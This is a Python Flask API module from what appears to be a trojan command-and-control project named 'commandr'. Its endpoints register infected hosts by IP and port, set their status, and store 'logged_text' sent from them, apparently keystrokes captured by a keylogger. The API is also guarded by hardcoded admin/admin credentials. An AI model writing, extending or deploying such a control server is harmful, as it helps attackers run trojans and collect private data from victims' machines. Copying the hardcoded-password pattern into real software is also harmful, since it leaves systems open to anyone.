# Code for this file taken and adapted from:
# https://blog.miguelgrinberg.com/post/designing-a-restful-api-with-python-and-flask
# https://programminghistorian.org/en/lessons/creating-apis-with-python-and-flask
# http://www.patricksoftwareblog.com/receiving-files-with-a-flask-rest-api/

import functools
import os

from flask import (
    Blueprint, redirect, render_template, request, url_for, jsonify, make_response, abort
)
from flask_httpauth import HTTPBasicAuth

from commandr.db import get_db

bp = Blueprint('api', __name__, url_prefix='/api')
auth = HTTPBasicAuth()

# Super useful function that converts a 
# SQLite row to Python dictionary
#
# Code for this method was taken from:
# https://programminghistorian.org/en/lessons/creating-apis-with-python-and-flask
def dict_factory(cursor, row):
    d = {}
    for idx, col in enumerate(cursor.description):
        d[col[0]] = row[idx]
    return d

@auth.get_password
def get_password(username):
    if username == 'admin':
        return 'admin'
    return None

@auth.error_handler
def unauthorized():
    return make_response(jsonify({'error': 'Unauthorized access'}), 403)

@bp.errorhandler(404)
def not_found(error):
    return make_response(jsonify({'error': 'Resource not found'}), 404)

@bp.errorhandler(409)
def conflict(error):
    return make_response(jsonify({'error': 'Resource already exists'}), 409)

@bp.route('/v1/trojans/create', methods=['POST'])
@auth.login_required
def create_trojan():
    params = request.args
    db = get_db()
    db.row_factory = dict_factory

    ip = params.get('ip')
    port = params.get('port')

    if not ip and not port:
        return not_found(404)

    db.execute(
        'INSERT INTO trojan (ip, port, status) VALUES (?, ?, ?)', (ip, port, 1)
    )
    db.commit()

    result = db.execute(
        'SELECT * FROM trojan WHERE ip = ? AND port = ?', (ip, port)
    ).fetchone()
    return jsonify(result)

@bp.route('/v1/trojans', methods=['PUT'])
@auth.login_required
def update_trojan():
    params = request.args

    trojan_id = params.get('id')
    status = params.get('status')

    if not trojan_id:
        return not_found(404)

    db = get_db()
    db.row_factory = dict_factory

    if status:
        db.execute(
            'UPDATE trojan SET status = ?,'
            ' last_updated = CURRENT_TIMESTAMP WHERE id = ?',
            (status, trojan_id)
        )
        db.commit()

        result = db.execute(
            'SELECT * FROM trojan WHERE id = ?', (trojan_id,)
        ).fetchone()
    elif request.json:
        data = request.json['logged_text']
        data_list = data.split('\n')
        data_list.reverse()
        data = '\n'.join(data_list)
        db.execute(
            'UPDATE trojan SET logged_text = ?,'
            ' last_updated = CURRENT_TIMESTAMP WHERE id = ?',
            (data, trojan_id)
        )
        db.commit()

        result = db.execute(
            'SELECT * FROM trojan WHERE id = ?', (trojan_id,)
        ).fetchone()
    else:
        return not_found(404)

    return jsonify(result)
